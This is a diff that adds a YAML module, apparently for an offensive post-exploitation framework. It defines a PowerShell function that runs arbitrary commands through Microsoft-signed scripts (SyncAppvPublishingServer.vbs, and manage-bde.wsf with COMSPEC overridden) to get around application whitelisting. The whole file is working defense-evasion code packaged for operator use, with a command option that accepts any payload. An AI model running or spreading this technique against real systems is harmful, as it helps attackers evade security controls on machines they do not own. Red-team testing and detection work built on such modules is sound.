@@ -1,0 +1,83 @@
+name: Invoke-SignedScript
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Executes commands via signed script proxy execution using Windows
+  built-in signed scripts. Supports SyncAppvPublishingServer.vbs
+  which can execute arbitrary PowerShell commands, and manage-bde.wsf
+  which executes commands by overriding the COMSPEC environment
+  variable. These are legitimate Microsoft-signed scripts that can be
+  abused to bypass application whitelisting.
+software: ''
+tactics: [TA0005]
+techniques: [T1216]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Method
+    description: Signed script to use for proxy execution.
+    required: false
+    value: 'syncappv'
+    suggested_values:
+      - syncappv
+      - managebde
+  - name: Command
+    description: Command or PowerShell code to execute.
+    required: true
+    value: 'Start-Process calc'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-SignedScript {
+      param(
+          [string]$Method = "syncappv",
+          [string]$Command
+      )
+
+      switch ($Method.ToLower()) {
+          "syncappv" {
+              $vbsPath = "C:\windows\system32\SyncAppvPublishingServer.vbs"
+              if (-not (Test-Path $vbsPath)) {
+                  Write-Output "[-] SyncAppvPublishingServer.vbs not found."
+                  return
+              }
+              $cmdLine = "$vbsPath `"\n;$Command`""
+              Write-Output "[*] Executing via SyncAppvPublishingServer.vbs..."
+              $result = cmd /c $cmdLine 2>&1
+              Write-Output "[+] Executed command via SyncAppvPublishingServer.vbs"
+              if ($result) { Write-Output $result }
+          }
+          "managebde" {
+              $wsfPath = "$env:windir\System32\manage-bde.wsf"
+              if (-not (Test-Path $wsfPath)) {
+                  Write-Output "[-] manage-bde.wsf not found."
+                  return
+              }
+              $origComspec = $env:ComSpec
+              $env:ComSpec = $Command
+              Write-Output "[*] Set COMSPEC to: $Command"
+              $result = cscript $wsfPath 2>&1
+              $env:ComSpec = $origComspec
+              Write-Output "[+] Executed via manage-bde.wsf, COMSPEC restored."
+              if ($result) { Write-Output $result }
+          }
+          default {
+              Write-Output "[-] Invalid method: $Method. Use syncappv or managebde."
+          }
+      }
+  }
+script_end: Invoke-SignedScript -Method "{{ Method }}" -Command "{{ Command }}" {{
+  PARAMS }} | {{ OUTPUT_FUNCTION }}
